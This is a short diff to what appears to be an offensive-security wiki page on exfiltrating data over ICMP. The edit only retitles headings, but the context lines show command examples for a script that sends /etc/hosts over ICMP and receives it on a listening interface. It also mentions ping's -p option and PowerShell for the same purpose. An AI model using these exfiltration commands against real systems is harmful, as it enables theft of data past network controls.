@@ -22,7 +22,7 @@ Notably, **RFC 792** (which defines ICMP) does not impose any strict requirement
 
 {% tabs %}
 {% tab title="Manualy" %}
-## Linux Target
+### Linux Target
 
 We can, on linux targets, exfiltrate datas with the `-p` options of the `ping` command.
 
@@ -57,7 +57,7 @@ python3 icmp_exfiltration.py -i 127.0.0.1 -m send -f /etc/hosts
 python3 icmp_exfiltration.py -i wlan0 -m recv -f mydata
 ```
 
-## Windows Victime
+### Windows Target
 
 On a Windows victime, we may exfiltrate data over ICMP using poweshell
 
